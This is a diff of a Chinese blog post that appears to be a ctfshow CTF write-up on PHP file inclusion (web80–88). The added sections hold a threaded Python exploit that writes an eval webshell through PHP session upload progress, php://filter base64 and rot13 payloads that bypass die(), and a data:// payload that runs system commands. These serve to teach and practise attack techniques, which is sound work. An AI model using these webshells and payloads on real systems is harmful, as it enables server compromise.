@@ -29,7 +29,7 @@
 <meta property="og:description" content="前言文件包含不够熟练，需要增加熟练度。">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2022-12-30T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-12-31T09:50:43.065Z">
+<meta property="article:modified_time" content="2023-01-16T09:06:16.270Z">
 <meta property="article:author" content="Bron">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="文件包含">
@@ -129,17 +129,17 @@
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">39</span></a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">42</span></a>
 
   </li>
         <li class="menu-item menu-item-categories">
 
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">38</span></a>
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">42</span></a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">110</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">115</span></a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -216,10 +216,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2022-12-31 00:00:00 / 修改时间：17:50:43" itemprop="dateCreated datePublished" datetime="2022-12-31T00:00:00+08:00">2022-12-31</time>
+              <time title="创建时间：2022-12-31 00:00:00" itemprop="dateCreated datePublished" datetime="2022-12-31T00:00:00+08:00">2022-12-31</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-01-16 17:06:16" itemprop="dateModified" datetime="2023-01-16T17:06:16+08:00">2023-01-16</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -247,14 +253,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>2k</span>
+              <span>5.2k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>2 分钟</span>
+              <span>5 分钟</span>
             </span>
 
         </div>
@@ -302,12 +308,46 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=http://xxxx/shell.txt</span><br><span class="line">shell.txt中内容</span><br><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>
 <p>成功拿到flag</p>
 <h1 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h1><p>方式同上</p>
-<h1 id="web82"><a href="#web82" class="headerlink" title="web82"></a>web82</h1><h1 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h1><ol>
+<h1 id="web82-86"><a href="#web82-86" class="headerlink" title="web82-86"></a>web82-86</h1><p>原理可以看看这篇文章：<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a><br>Python脚本如下：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">sess = <span class="string">&#x27;123&#x27;</span></span><br><span class="line">url1 = <span class="string">&quot;http://f90712a3-dacd-4f10-a4af-3fb63dfc16e4.challenge.ctf.show/&quot;</span></span><br><span class="line">url2 = <span class="string">&#x27;http://f90712a3-dacd-4f10-a4af-3fb63dfc16e4.challenge.ctf.show/?file=/tmp/sess_&#x27;</span> + sess</span><br><span class="line"></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data2 = &#123;</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;system(&quot;cat f*&quot;);&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">file = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: <span class="string">&#x27;abc&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: sess</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = session.post(url1, data=data1, files=file, cookies=cookies)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = session.post(url2, data=data2)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;ctfshow&#123;&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">threads = [threading.Thread(target=write),</span><br><span class="line">           threading.Thread(target=read)]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">    t.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这段代码使用了 Python 的 requests 库来对一个特定的 URL 进行攻击。它创建了两个线程，一个线程执行写操作，另一个线程执行读操作。</p>
+<p>在写操作线程中，它会不断地以 <code>multipart/form-data</code> 的形式向 URL1 发送 POST 请求，其中包含一个文件和一个名为 <code>PHP_SESSION_UPLOAD_PROGRESS</code> 的数据。这个文件的内容是<code>&lt;?php eval($_POST[1]);?&gt;</code> 。</p>
+<p>在读操作线程中，它会不断地向 URL2 发送 POST 请求，其中包含一个名为 1 的数据，值为 <code>system(&quot;cat f*&quot;);</code> 。这个请求会使得在服务器上执行 cat f* 的命令。如果返回的结果中包含 ctfshow{ ，它会将返回的结果打印出来.</p>
+<p>这段代码使用了多线程的技术，可以同时进行写和读操作，最终目的是构造出一个能够执行系统命令的 payload，在返回的结果中寻找flag。</p>
+<p>这种攻击方式是由于服务器上存在文件上传漏洞而导致的，由于服务器没有对文件的内容进行限制，攻击者可以上传一个带有恶意代码的文件，使得服务器执行恶意代码，达到攻击目的。</p>
+<h1 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h1><ol>
 <li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
 </ol>
 <ul>
-<li>php:&#x2F;&#x2F;filter的妙用<br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">php:&#x2F;&#x2F;filter的妙用</a></li>
+<li><p>php:&#x2F;&#x2F;filter的妙用与如何绕过die和exit<br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">php:&#x2F;&#x2F;filter的妙用</a></p>
+</li>
+<li><p>PHP支持的编码方式<br><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/mbstring.supported-encodings.php">支持的字符编码</a><br>还有多种编码可以绕过</p>
+</li>
 </ul>
+<p>首先是要通过GET方式一个参数file，以及POST方式一个参数content。对参数file进行了几个过滤。<br>最后写入文件，因为有urldecode，所以需要将file进行二次编码。content参数之前跟了die，这是为了content里即使有php代码也无法执行，那么我们关键是要绕过这个die，这个在上面链接文章里有所提及。</p>
+<p><code>$_POST[&#39;content&#39;]</code> 可以控制协议，即可使用 <code>php://filter</code> 流的 <code>base64-decode</code> 方法将 <code>$content</code> 解码，利用php的 base64_decode函数特性来去除die。因为base64编码只包含<a target="_blank" rel="noopener" href="https://foofish.net/base64.html">64个可打印字符</a>，解码base64时，遇到不在其中的字符会跳过，仅将合法字符重新组成一个新的字符串进行解码。</p>
+<p>于是， <code>&lt;?php die(&#39;大佬别秀了&#39;);?&gt;</code> 这段代码最终剩下的只有 <code>phpdie</code> 。因为base64编码4个一组，所以我们再填上两个合法字符，这样便能正常解码，后面传入的content也就能正常解码了，最后我们发现 <code>&lt;?php die(&#39;大佬别秀了&#39;);?&gt;</code> 这段代码就不存在了。</p>
+<p>当PHP没有开启short_open_tag时，我们还可以采用rot13编码绕过检测，原理同上面类似。</p>
+<p>于是这道题一般来说有2类方法，用base64绕过或rot13绕过。</p>
+<ul>
+<li><p>base64绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">?file=%2570%2568%2570%253a%252f%252f%2566%2569%256c%2574%2565%2572%252f%2577%2572%2569%2574%2565%253d%2563%256f%256e%2576%2565%2572%2574%252e%2562%2561%2573%2565%2536%2534%252d%2564%2565%2563%256f%2564%2565%252f%2572%2565%2573%256f%2575%2572%2563%2565%253d%2563%252e%2570%2568%2570</span><br><span class="line">// 这是经过了二次url编码的字符，原来的字符为：</span><br><span class="line">?file=php://filter/read=string.rot13/resource=c.php</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">content=11PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg==</span><br><span class="line">// 这是经过了base64编码的字符，原来的字符为：</span><br><span class="line">content=&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>rot13绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">与上面的GET相同</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">content=&lt;?cuc riny($_CBFG[1]);?&gt;</span><br><span class="line">// 这是经过了rot13编码的字符，原来的字符为：</span><br><span class="line">content=&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>成功后，访问c.php，并且POST传参 <code>1=system(&#39;tac f*&#39;);</code><br>即可成功拿到flag</p>
+<h1 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h1><ol>
+<li><p>查看源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>咋一看，过滤了蛮多，但是不要紧，直接用data伪协议，把要执行的命令进行base64编码</p>
+</li>
+<li><p>构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZionKTs/Pg</span><br></pre></td></tr></table></figure>
+<p>注意如果base64编码中有“&#x3D;”要去掉，否则会造成error</p>
+</li>
+</ol>
+<p>成功拿到flag</p>
 
     </div>
 
@@ -459,7 +499,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web78"><span class="nav-number">2.</span> <span class="nav-text">web78</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web79"><span class="nav-number">3.</span> <span class="nav-text">web79</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web80"><span class="nav-number">4.</span> <span class="nav-text">web80</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web81"><span class="nav-number">5.</span> <span class="nav-text">web81</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web82"><span class="nav-number">6.</span> <span class="nav-text">web82</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web87"><span class="nav-number">7.</span> <span class="nav-text">web87</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web78"><span class="nav-number">2.</span> <span class="nav-text">web78</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web79"><span class="nav-number">3.</span> <span class="nav-text">web79</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web80"><span class="nav-number">4.</span> <span class="nav-text">web80</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web81"><span class="nav-number">5.</span> <span class="nav-text">web81</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web82-86"><span class="nav-number">6.</span> <span class="nav-text">web82-86</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web87"><span class="nav-number">7.</span> <span class="nav-text">web87</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web88"><span class="nav-number">8.</span> <span class="nav-text">web88</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -475,20 +515,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">110</span>
+          <span class="site-state-item-count">115</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">38</span>
+        <span class="site-state-item-count">42</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">39</span>
+        <span class="site-state-item-count">42</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -546,13 +586,13 @@
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">306k</span>
+    <span title="站点总字数">319k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">4:38</span>
+    <span title="站点阅读时长">4:50</span>
 </div>
 
 <!--
